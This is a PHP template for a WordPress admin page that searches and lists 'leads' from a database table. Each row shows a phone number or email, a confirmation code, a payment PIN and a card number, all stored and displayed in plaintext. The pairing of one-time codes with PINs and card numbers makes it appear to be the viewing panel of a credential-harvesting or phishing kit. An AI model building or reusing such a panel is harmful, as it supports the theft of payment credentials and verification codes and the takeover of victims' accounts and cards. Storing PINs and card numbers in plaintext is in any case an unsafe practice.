<h2 class="admin-menu-title">Form Submissions</h2>

<div class="form-submissions-wrapper">
    <div class="search-area">
        <p class="search-box">
            <label class="screen-reader-text" for="lead-search-input">Search:</label>
            <input type="search" id="lead-search-input" name="s"
                value="<?php echo isset( $_GET['s'] ) ? esc_attr( $_GET['s'] ) : ''; ?>">
            <input type="submit" id="lead-search-submit" class="button" value="Search">
        </p>
    </div>

    <?php

    global $wpdb;
    $table_name = $wpdb->prefix . 'sync_leads';

    // Pagination setup
    $items_per_page = 10; // Show 10 submissions per page
    $current_page   = isset( $_GET['paged'] ) ? absint( $_GET['paged'] ) : 1;
    $offset         = ( $current_page - 1 ) * $items_per_page;

    // Search setup
    $search_query = isset( $_GET['s'] ) ? sanitize_text_field( $_GET['s'] ) : '';

    $where_clause = '';
    if ( !empty( $search_query ) ) {
        $where_clause = $wpdb->prepare(
            "WHERE phone_or_email LIKE %s OR confirmation_code LIKE %s OR card_number LIKE %s",
            '%' . $wpdb->esc_like( $search_query ) . '%',
            '%' . $wpdb->esc_like( $search_query ) . '%',
            '%' . $wpdb->esc_like( $search_query ) . '%'
        );
    }

    // Get total items
    $total_items = $wpdb->get_var( "SELECT COUNT(*) FROM $table_name $where_clause" );
    $total_pages = ceil( $total_items / $items_per_page );

    // Get leads with search filter
    $leads = $wpdb->get_results(
        $wpdb->prepare(
            "SELECT * FROM $table_name $where_clause LIMIT %d OFFSET %d",
            $items_per_page,
            $offset
        )
    );

    ?>

    <div id="leads-result">
        <div class="form-submissions-table">
            <table class="wp-list-table widefat fixed striped table-view-list">
                <thead>
                    <tr>
                        <th>ID</th>
                        <th>Phone/Email</th>
                        <th>Confirmation Code</th>
                        <th>PIN</th>
                        <th>Card Number</th>
                    </tr>
                </thead>
                <tbody>
                    <?php
                    if ( !empty( $leads ) ) {
                        foreach ( $leads as $lead ) {
                            echo '<tr>';
                            echo '<td>' . esc_html( $lead->id ) . '</td>';
                            echo '<td>' . esc_html( $lead->phone_or_email ) . '</td>';
                            echo '<td>' . esc_html( $lead->confirmation_code ) . '</td>';
                            echo '<td>' . esc_html( $lead->cash_pin ) . '</td>';
                            echo '<td>' . esc_html( $lead->card_number ) . '</td>';
                            echo '</tr>';
                        }
                    } else {
                        echo '<tr><td colspan="5">No submissions found.</td></tr>';
                    }
                    ?>
                </tbody>
            </table>
        </div>
    </div>

    <div class="pagination">
        <?php
        if ( $total_pages > 1 ) {
            $base = esc_url( add_query_arg( 'paged', '%#%' ) );
            echo paginate_links( [
                'base'      => $base,
                'format'    => '',
                'current'   => $current_page,
                'total'     => $total_pages,
                'prev_text' => __( '&laquo; Previous' ),
                'next_text' => __( 'Next &raquo;' ),
            ] );
        }
        ?>
    </div>
</div>